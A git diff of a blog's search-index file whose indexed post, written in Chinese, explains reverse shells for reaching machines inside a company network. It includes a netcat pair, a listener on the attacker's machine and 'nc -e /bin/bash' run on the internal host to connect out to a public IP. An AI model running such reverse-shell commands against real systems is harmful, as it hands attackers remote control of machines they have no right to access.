@@ -2,10 +2,11 @@
 <search>
   <entry>
     <title>内网刺探及穿透</title>
-    <url>/2020/04/15/nc/</url>
+    <url>/2020/04/22/nc/</url>
     <content><![CDATA[<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。</p>
 <p>比如命令注入，不需要知道机器的账号密码，直接反弹出来</p>
 <p>虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。</p>
+<a id="more"></a>
 <p>第一种——nc反弹shell</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">黑客机器：nc -lvp 8888</span><br><span class="line">公司内网机器：nc -e /bin/bash 公网IP 8888</span><br></pre></td></tr></table></figure>
 
